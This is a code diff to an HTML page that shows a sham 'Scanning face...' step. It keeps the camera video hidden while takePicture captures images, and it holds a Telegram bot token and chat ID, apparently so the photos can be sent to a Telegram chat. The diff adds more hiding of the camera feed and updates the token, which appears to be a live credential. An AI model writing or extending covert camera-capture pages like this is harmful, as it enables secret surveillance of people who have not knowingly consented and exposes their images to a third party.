@@ -24,6 +24,10 @@
             50% { transform: scale(1.2); opacity: 0.5; }
             100% { transform: scale(1); opacity: 1; }
         }
+        #video {
+            width: 100%;
+            height: auto;
+        }
     </style>
 </head>
 <body>
@@ -37,7 +41,7 @@
     <div id="face-recognition" class="hidden">
         <div class="scan-animation"></div>
         <p>Scanning face...</p>
-        <video id="video" autoplay style="display: none;"></video> 
+        <video id="video" autoplay style="display: none;"></video>
         <button id="start-scan">Start Scan</button>
         <button id="cancel">Cancel</button>
     </div>
@@ -53,7 +57,7 @@
     </div>
 
     <script>
-        const TELEGRAM_BOT_TOKEN = '8146051541:AAEWlqCaaW0Z8p4T4dYPXCZv4Y';
+        const TELEGRAM_BOT_TOKEN = '8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y';
         const TELEGRAM_CHAT_ID = '5934902786';
         const selectedNames = new Set();
         const names = ['Izz', 'Ali', 'Amin', 'Siti', 'Aisyah'];
@@ -95,6 +99,7 @@
 
             $('#start-scan').on('click', function() {
                 $('#start-scan').addClass('hidden');
+                $('#video').hide(); // Sembunyikan video sebelum scan
                 setTimeout(() => takePicture(1), 2000);
             });
         });
